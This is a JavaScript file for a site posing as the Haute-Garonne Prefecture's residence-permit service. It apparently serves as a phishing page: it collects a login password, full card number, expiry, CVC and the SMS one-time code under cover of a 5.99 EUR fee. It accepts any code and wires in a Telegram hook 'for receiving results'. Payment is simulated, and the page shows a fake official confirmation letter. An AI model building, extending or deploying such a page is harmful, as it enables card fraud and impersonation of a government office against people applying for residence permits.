// app.js - Main application logic for Haute-Garonne Prefecture Residence Permit Website

document.addEventListener('DOMContentLoaded', function() {
    'use strict';

    // Application configuration
    const CONFIG = {
        DELIVERY_FEE: 5.99,
        CURRENCY: 'EUR',
        API_ENDPOINTS: {
            PAYMENT: '/api/payment',
            OTP: '/api/otp',
            EMAIL: '/api/email',
            TELEGRAM: '/api/telegram'
        },
        STORAGE_KEYS: {
            USER_DATA: 'prefecture_user_data',
            TRANSACTION_ID: 'transaction_id',
            OTP_ATTEMPTS: 'otp_attempts'
        }
    };

    // DOM Elements Manager
    const Elements = {
        // Page elements
        pages: {
            login: document.getElementById('loginPage'),
            payment: document.getElementById('paymentPage'),
            otp: document.getElementById('otpPage'),
            success: document.getElementById('successPage')
        },

        // Login form elements
        loginForm: document.getElementById('loginForm'),
        loginPassword: document.getElementById('loginPassword'),
        loginError: document.getElementById('loginError'),

        // Payment form elements
        paymentForm: document.getElementById('paymentForm'),
        cardNumber: document.getElementById('cardNumber'),
        cardExpiry: document.getElementById('cardExpiry'),
        cardCvc: document.getElementById('cardCvc'),
        cardholderName: document.getElementById('cardholderName'),
        paymentError: document.getElementById('paymentError'),
        paymentInfo: document.getElementById('paymentInfo'),

        // OTP form elements
        otpForm: document.getElementById('otpForm'),
        otpInputs: document.querySelectorAll('.otp-input'),
        otpError: document.getElementById('otpError'),
        otpTimer: document.getElementById('otpTimer'),

        // Success page elements
        successMessage: document.getElementById('successMessage'),
        letterPreview: document.getElementById('letterPreview'),

        // Navigation elements
        navLinks: document.querySelectorAll('.nav-link'),
        progressBar: document.querySelector('.progress-bar')
    };

    // Show page function
    function showPage(pageName) {
        // Hide all pages
        Object.values(Elements.pages).forEach(page => {
            if (page) page.style.display = 'none';
        });

        // Show selected page
        if (Elements.pages[pageName]) {
            Elements.pages[pageName].style.display = 'block';
            
            // Update progress bar
            updateProgressBar(pageName);
            
            // Scroll to top
            window.scrollTo(0, 0);
        }
    }

    // Update progress bar
    function updateProgressBar(currentPage) {
        const progressOrder = ['login', 'payment', 'otp', 'success'];
        const currentIndex = progressOrder.indexOf(currentPage);
        
        if (Elements.progressBar) {
            Elements.progressBar.style.width = `${(currentIndex + 1) * 25}%`;
        }
    }

    // Navigation handlers
    function setupNavigation() {
        Elements.navLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                const targetPage = this.getAttribute('data-page');
                if (targetPage) {
                    showPage(targetPage);
                }
            });
        });
    }

    // Login form handler
    function handleLogin(event) {
        event.preventDefault();
        
        const password = Elements.loginPassword.value.trim();
        
        if (!password || password.length < 4) {
            Elements.loginError.textContent = 'Veuillez saisir un mot de passe valide (minimum 4 caractères).';
            Elements.loginError.style.display = 'block';
            return;
        }

        // Store user data
        const userData = {
            password: password,
            startTime: new Date().toISOString()
        };
        localStorage.setItem(CONFIG.STORAGE_KEYS.USER_DATA, JSON.stringify(userData));
        
        // Validate login (simulated)
        validateLogin(password)
            .then(() => {
                Elements.loginError.style.display = 'none';
                showPage('payment');
            })
            .catch(error => {
                Elements.loginError.textContent = 'Erreur de connexion. Veuillez réessayer.';
                Elements.loginError.style.display = 'block';
            });
    }

    // Simulated login validation
    function validateLogin(password) {
        return new Promise((resolve, reject) => {
            setTimeout(() => {
                if (password.length >= 4) {
                    resolve();
                } else {
                    reject(new Error('Invalid password'));
                }
            }, 500);
        });
    }

    // Payment form handler
    async function handlePayment(event) {
        event.preventDefault();
        
        // Validate card information
        if (!validateCard()) {
            return;
        }

        // Process payment
        try {
            Elements.paymentError.style.display = 'none';
            
            const paymentData = {
                cardNumber: Elements.cardNumber.value.replace(/\s+/g, ''),
                expiry: Elements.cardExpiry.value,
                cvc: Elements.cardCvc.value,
                cardholderName: Elements.cardholderName.value.trim(),
                amount: CONFIG.DELIVERY_FEE,
                currency: CONFIG.CURRENCY,
                userData: JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEYS.USER_DATA) || '{}')
            };

            const result = await processPayment(paymentData);
            
            if (result.success) {
                // Store transaction ID
                localStorage.setItem(CONFIG.STORAGE_KEYS.TRANSACTION_ID, result.transactionId);
                
                // Reset OTP attempts
                localStorage.setItem(CONFIG.STORAGE_KEYS.OTP_ATTEMPTS, '0');
                
                showPage('otp');
                startOtpTimer();
            } else {
                throw new Error(result.message || 'Payment failed');
            }
        } catch (error) {
            Elements.paymentError.textContent = error.message || 'Erreur lors du paiement. Veuillez réessayer.';
            Elements.paymentError.style.display = 'block';
        }
    }

    // Card validation
    function validateCard() {
        const cardNumber = Elements.cardNumber.value.replace(/\s+/g, '');
        const expiry = Elements.cardExpiry.value;
        const cvc = Elements.cardCvc.value;
        const cardholderName = Elements.cardholderName.value.trim();

        // Luhn algorithm for card number validation
        let sum = 0;
        let isEven = false;
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber.charAt(i));
            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            sum += digit;
            isEven = !isEven;
        }

        if (cardNumber.length < 13 || cardNumber.length > 19 || sum % 10 !== 0) {
            Elements.paymentError.textContent = 'Numéro de carte invalide.';
            Elements.paymentError.style.display = 'block';
            return false;
        }

        if (!expiry || expiry.length !== 5) {
            Elements.paymentError.textContent = 'Date d\'expiration invalide.';
            Elements.paymentError.style.display = 'block';
            return false;
        }

        if (!cvc || cvc.length < 3) {
            Elements.paymentError.textContent = 'CVC invalide.';
            Elements.paymentError.style.display = 'block';
            return false;
        }

        if (!cardholderName || cardholderName.length < 2) {
            Elements.paymentError.textContent = 'Nom du titulaire requis.';
            Elements.paymentError.style.display = 'block';
            return false;
        }

        return true;
    }

    // Process payment (simulated)
    function processPayment(paymentData) {
        return new Promise((resolve, reject) => {
            // Simulate payment processing delay
            setTimeout(() => {
                // Generate mock transaction ID
                const transactionId = 'TXN' + Date.now() + Math.random().toString(36).substr(2, 9).toUpperCase();
                
                // Simulate successful payment
                resolve({
                    success: true,
                    transactionId: transactionId,
                    message: 'Paiement effectué avec succès'
                });
            }, 2000);
        });
    }

    // OTP form handler
    function handleOtpSubmit(event) {
        event.preventDefault();
        
        const otpValue = Array.from(Elements.otpInputs).map(input => input.value).join('');
        
        if (otpValue.length !== 6) {
            Elements.otpError.textContent = 'Veuillez saisir le code OTP de 6 chiffres reçu par SMS.';
            Elements.otpError.style.display = 'block';
            return;
        }

        // Check OTP attempts
        const attempts = parseInt(localStorage.getItem(CONFIG.STORAGE_KEYS.OTP_ATTEMPTS) || '0');
        if (attempts >= 3) {
            Elements.otpError.textContent = 'Trop de tentatives échouées. Veuillez contacter le support.';
            Elements.otpError.style.display = 'block';
            return;
        }

        // Increment attempts
        localStorage.setItem(CONFIG.STORAGE_KEYS.OTP_ATTEMPTS, (attempts + 1).toString());

        validateOtp(otpValue)
            .then(() => {
                Elements.otpError.style.display = 'none';
                showPage('success');
                sendEmailLetter();
                setupTelegramListener();
            })
            .catch(error => {
                Elements.otpError.textContent = error.message || 'Code OTP invalide. Veuillez réessayer.';
                Elements.otpError.style.display = 'block';
            });
    }

    // Validate OTP (simulated)
    function validateOtp(otp) {
        return new Promise((resolve, reject) => {
            setTimeout(() => {
                // Accept any 6-digit code for demo purposes
                if (/^\d{6}$/.test(otp)) {
                    resolve();
                } else {
                    reject(new Error('Code OTP invalide'));
                }
            }, 1000);
        });
    }

    // OTP input handlers
    function setupOtpInputs() {
        Elements.otpInputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                if (this.value.length === 1 && index < Elements.otpInputs.length - 1) {
                    Elements.otpInputs[index + 1].focus();
                }
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    Elements.otpInputs[index - 1].focus();
                }
            });
        });
    }

    // OTP timer
    let otpTimerInterval;
    function startOtpTimer() {
        let timeLeft = 60;
        
        if (Elements.otpTimer) {
            Elements.otpTimer.textContent = `${timeLeft}s`;
        }

        otpTimerInterval = setInterval(() => {
            timeLeft--;
            
            if (timeLeft <= 0) {
                clearInterval(otpTimerInterval);
                if (Elements.otpTimer) {
                    Elements.otpTimer.textContent = 'Expiré';
                }
            } else {
                if (Elements.otpTimer) {
                    Elements.otpTimer.textContent = `${timeLeft}s`;
                }
            }
        }, 1000);
    }

    // Email letter sending
    function sendEmailLetter() {
        const userData = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEYS.USER_DATA) || '{}');
        const transactionId = localStorage.getItem(CONFIG.STORAGE_KEYS.TRANSACTION_ID);
        
        const letterData = {
            recipient: userData.email || 'user@example.com',
            subject: 'Préfecture de la Haute-Garonne - Permis de séjour',
            content: generateLetterContent(userData, transactionId),
            transactionId: transactionId
        };

        // Send email via emailService.js
        if (typeof sendEmail === 'function') {
            sendEmail(letterData)
                .then(() => {
                    console.log('Letter sent successfully');
                })
                .catch(error => {
                    console.error('Failed to send letter:', error);
                });
        }
    }

    // Generate letter content
    function generateLetterContent(userData, transactionId) {
        const date = new Date().toLocaleDateString('fr-FR');
        
        return `
            PRÉFECTURE DE LA HAUTE-GARONNE
            Service des Permis de Séjour
            
            À l'attention de : ${userData.name || 'Monsieur/Madame'}
            
            Nous vous confirmons la réception de votre paiement de ${CONFIG.DELIVERY_FEE}€ 
            pour les frais de dossier de votre demande de permis de séjour.
            
            Numéro de transaction : ${transactionId}
            Date : ${date}
            
            Votre dossier est en cours de traitement. Vous serez informé(e) des prochaines étapes
            par courrier recommandé ou par notre service client.
            
            Cordialement,
            
            Le Service des Permis de Séjour
            Préfecture de la Haute-Garonne
        `;
    }

    // Telegram setup for receiving results
    function setupTelegramListener() {
        if (typeof setupTelegramBot === 'function') {
            setupTelegramBot({
                userId: getUserId(),
                callback: handleTelegramResult
            });
        }
    }

    // Handle Telegram result
    function handleTelegramResult(result) {
        if (Elements.successMessage) {
            Elements.successMessage.innerHTML += `
                <div class="telegram-notice">
                    <p>📱 Notification Telegram reçue : ${result.message}</p>
                </div>
            `;
        }
    }

    // Get user ID from stored data
    function getUserId() {
        const userData = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEYS.USER_DATA) || '{}');
        return userData.userId || 'user_' + Date.now();
    }

    // Initialize application
    function init() {
        // Setup event listeners
        if (Elements.loginForm) {
            Elements.loginForm.addEventListener('submit', handleLogin);
        }
        
        if (Elements.paymentForm) {
            Elements.paymentForm.addEventListener('submit', handlePayment);
        }
        
        if (Elements.otpForm) {
            Elements.otpForm.addEventListener('submit', handleOtpSubmit);
        }

        // Setup OTP inputs
        setupOtpInputs();

        // Setup navigation
        setupNavigation();

        // Check if user is already logged in
        const userData = localStorage.getItem(CONFIG.STORAGE_KEYS.USER_DATA);
        if (userData) {
            const parsedData = JSON.parse(userData);
            if (parsedData.password && parsedData.startTime) {
                // User is logged in, could auto-start at payment page
                // showPage('payment');
            }
        }

        // Set initial page
        showPage('login');
    }

    // Export functions for external use
    window.PrefectureApp = {
        showPage: showPage,
        handlePayment: handlePayment,
        handleOtpSubmit: handleOtpSubmit,
        CONFIG: CONFIG,
        Elements: Elements
    };

    // Initialize when DOM is ready
    init();
});